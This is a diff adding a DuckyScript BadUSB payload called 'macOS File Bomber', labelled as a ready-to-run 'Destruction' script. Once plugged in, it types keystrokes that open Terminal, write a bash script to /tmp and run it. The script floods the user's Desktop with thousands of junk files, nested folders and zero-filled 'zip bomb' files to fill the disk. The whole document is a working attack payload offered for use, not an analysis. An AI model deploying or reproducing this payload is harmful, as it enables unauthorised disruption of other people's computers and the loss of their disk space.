@@ -1,0 +1,73 @@
+REM Title: macOS File Bomber
+REM Author: BadUSB Library
+REM Description: Creates massive amounts of files to fill disk space
+REM Target: macOS 10.15+
+REM Category: Destruction
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Create file bomber script
+STRING cat > /tmp/file_bomber.sh << 'EOF'
+#!/bin/bash
+
+echo "Starting file bomber..."
+
+# Create bomb directory
+BOMB_DIR="$HOME/Desktop/FileBomb_$(date +%Y%m%d_%H%M%S)"
+mkdir -p "$BOMB_DIR"
+
+# Function to create files
+create_files() {
+    local count="$1"
+    local size="$2"
+    
+    for i in $(seq 1 $count); do
+        dd if=/dev/zero of="$BOMB_DIR/bomb_file_$i" bs=1024 count=$size 2>/dev/null
+        echo "Created bomb_file_$i"
+    done
+}
+
+# Create massive files
+echo "Creating large files..."
+create_files 100 1024  # 100 files of 1MB each
+
+# Create many small files
+echo "Creating many small files..."
+for i in $(seq 1 10000); do
+    echo "Bomb file $i" > "$BOMB_DIR/small_bomb_$i.txt"
+done
+
+# Create nested directories with files
+echo "Creating nested directory structure..."
+for i in $(seq 1 100); do
+    mkdir -p "$BOMB_DIR/nested_$i"
+    for j in $(seq 1 50); do
+        echo "Nested bomb file $i-$j" > "$BOMB_DIR/nested_$i/bomb_$j.txt"
+    done
+done
+
+# Create zip bombs
+echo "Creating zip bombs..."
+cd "$BOMB_DIR"
+for i in $(seq 1 10); do
+    dd if=/dev/zero of="zip_bomb_$i.zip" bs=1024 count=10240 2>/dev/null
+done
+
+echo "File bomber completed. Created: $BOMB_DIR"
+echo "Total size: $(du -sh $BOMB_DIR)"
+
+EOF
+ENTER
+
+REM Make executable and run
+STRING chmod +x /tmp/file_bomber.sh
+ENTER
+STRING /tmp/file_bomber.sh
+ENTER
